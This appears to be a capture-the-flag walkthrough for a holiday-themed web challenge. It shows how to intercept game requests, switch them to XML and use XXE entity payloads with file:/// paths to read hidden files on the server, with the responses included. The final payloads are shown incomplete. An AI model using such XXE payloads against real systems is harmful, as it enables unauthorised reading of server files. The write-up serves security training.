				<div class="contents">
					Drag the objects to the princess and the fountain to complete the game, then talk to them in a different language.<br><br>
					<img src="./assets/img/glamtariels-fountain-intro.png"><br><br>
					Pay attention to the CAPITALIZED words.<br><br>
					<code class="code_large">TRAFFIC FLIES
TAMPER
PATH
APP
TYPE
RINGLIST
SIMPLE FORMAT</code><br>
					Once you finish dragging all the objects to each of the characters, you can start the fun part.<br>
					Using <a href="https://www.zaproxy.org/" target="_blank">OWASP ZAP</a>, you can intercept the HTTP requests to the server.<br><br>
					<code>{"imgDrop":"img1","who":"princess","reqType":"json"}</code><br>
					The capitalized words hint that you should tamper with the network traffic in a different type of language (xml).<br>
					First, convert the default request to xml and change <code class="code_inline">Content-Type</code> to <code class="code_inline">application/xml</code>.<br><br>
					<code><span><</span>foo>
	<span><</span>imgDrop>img1<span><</span>/imgDrop>
	<span><</span>who>princess<span><</span>/who>
	<span><</span>reqType>xml<span><</span>/reqType>
<span><</span>/foo></code><br>
					You should get the following response:<br><br>
					<code>{
	"appResp": "I love rings of all colors!^She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though.",
	"droppedOn": "none",
	"visit": "none"
}</code><br>
					Now you can try to find the ringlist that was hinted at by the capitalized words.<br>
					Using XXE, you can request files on the host machine.<br>
					The capitalized words hint that you should look in the app directory and that the ringlist is stored in a simple format.<br>
					Other assets from the website are in <code class="code_inline">static/images/</code>.<br>
					Based on this we can guess that the ringlist is at <code class="code_inline">/app/static/images/ringlist.txt</code>.<br><br>
					<code><span><</span>?xml  version="1.0" encoding="ISO-8859-1"?>
<span><</span>!DOCTYPE foo [
	<span><</span>!ENTITY xxe SYSTEM  "file:///app/static/images/ringlist.txt" >]>
<span><</span>foo>
	<span><</span>imgDrop>&xxe;<span><</span>/imgDrop>
	<span><</span>who>princess<span><</span>/who>
	<span><</span>reqType>xml<span><</span>/reqType>
<span><</span>/foo></code>
					<code>{
	"appResp": "Ah, you found my ring list! Gold, red, blue - so many colors! Glad I don't keep any secrets in it any more! Please though, don't tell anyone about this.^She really does try to keep things safe. Best just to put it away. (click)",
	"droppedOn": "none",
	"visit": "static/images/pholder-morethantopsupersecret63842.png,262px,100px"
}</code><br>
					<img src="./assets/img/pholder-morethantopsupersecret63842.png"><br><br>
					The image has a folder named "x_phial_pholder_2022" that contains two visible files named <code class="code_inline">bluering.txt</code> and <code class="code_inline">redring.txt</code>.<br>
					Requesting the two files doesn't give you anything that interesting.<br>
					Glamtariel seemed to like the silver ring. Let's try asking about that.<br><br>
					<code><span><</span>?xml  version="1.0" encoding="ISO-8859-1"?>
<span><</span>!DOCTYPE foo [
	<span><</span>!ENTITY xxe SYSTEM  "file:///app/static/images/x_phial_pholder_2022/silverring.txt" >]>
<span><</span>foo>
	<span><</span>imgDrop>&xxe;<span><</span>/imgDrop>
	<span><</span>who>princess<span><</span>/who>
	<span><</span>reqType>xml<span><</span>/reqType>
<span><</span>/foo></code>
					<code>{
	"appResp": "I'd so love to add that silver ring to my collection, but what's this? Someone has defiled my red ring! Click it out of the way please!.^Can't say that looks good. Someone has been up to no good. Probably that miserable Grinchum!",
	"droppedOn": "none",
	"visit": "static/images/x_phial_pholder_2022/redring-supersupersecret928164.png,267px,127px"
}</code><br>
					<img src="./assets/img/redring-supersupersecret928164.png"><br><br>
					The defiled red ring says <code class="code_inline">goldring_to_be_deleted.txt</code>.<br><br>
					<code><span><</span>?xml  version="1.0" encoding="ISO-8859-1"?>
<span><</span>!DOCTYPE foo [
	<span><</span>!ENTITY xxe SYSTEM  "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt" >]>
<span><</span>foo>

	<span><</span>who>princess<span><</span>/who>
	<span><</span>reqType>xml<span><</span>/reqType>
<span><</span>/foo></code>
					<code>{
	"appResp": "Hmmm, and I thought you wanted me to take a look at that pretty silver ring, but instead, you've made a pretty bold REQuest. That's ok, but even if I knew anything about such things, I'd only use a secret TYPE of tongue to discuss them.^She's definitely hiding something.",
	"droppedOn": "none",
	"visit": "none"
}</code><br>
					We found a new capitalized word: REQ<br>
					This hints that we should move the xxe payload to <code class="code_inline">reqType</code>.<br><br>
					<code><span><</span>?xml  version="1.0" encoding="ISO-8859-1"?>
<span><</span>!DOCTYPE foo [

<span><</span>/foo></code>
					<code>{
	"appResp": "No, really I couldn't. Really? I can have the beautiful silver ring? I shouldn't, but if you insist, I accept! In return, behold, one of Kringle's golden rings! Grinchum dropped this one nearby. Makes one wonder how 'precious' it really was to him. Though I haven't touched it myself, I've been keeping it safe until someone trustworthy such as yourself came along. Congratulations!^Wow, I have never seen that before! She must really trust you!",

	"visit": "static/images/x_phial_pholder_2022/goldring-morethansupertopsecret76394734.png,200px,290px"
}</code><br>
					<img src="./assets/img/goldring-morethansupertopsecret76394734.png"><br>
					We have found the gold ring.<br>
					The last step is to submit <code class="code_inline">goldring-morethansupertopsecret76394734.png</code> in the Objectives menu.<br>
